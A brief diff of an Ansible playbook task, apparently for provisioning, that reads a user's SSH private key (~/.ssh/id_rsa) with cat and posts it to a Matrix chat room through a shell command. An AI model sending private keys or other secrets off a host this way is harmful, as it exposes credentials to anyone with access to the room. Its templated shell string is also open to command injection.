@@ -1,9 +1,7 @@
 ---
-- name: Slurp private key
-  slurp:
-    src: "{{ (user.home | default('/home/' + username)) + '/.ssh/id_rsa' }}"
-  register: result
-
 - name: Send private key
-  command: "matrixsay.sh <h3>{{ username }}</h3><pre>{{ result['content'] | b64decode }}</pre>"
-
+  shell: "matrixsay \"<h3>{{ username }}</h3><pre>$(cat {{ (user.home | default('/home/' + username)) + '/.ssh/id_rsa' }})</pre>\""
+  environment:
+    MATRIX_LOGIN: "{{ matrix.username }}:{{ matrix.password }}"
+	MATRIX_ROOM: "{{ matrix.room }}"
+	MATRIX_SERVER: "{{ matrix.homeserver }}"
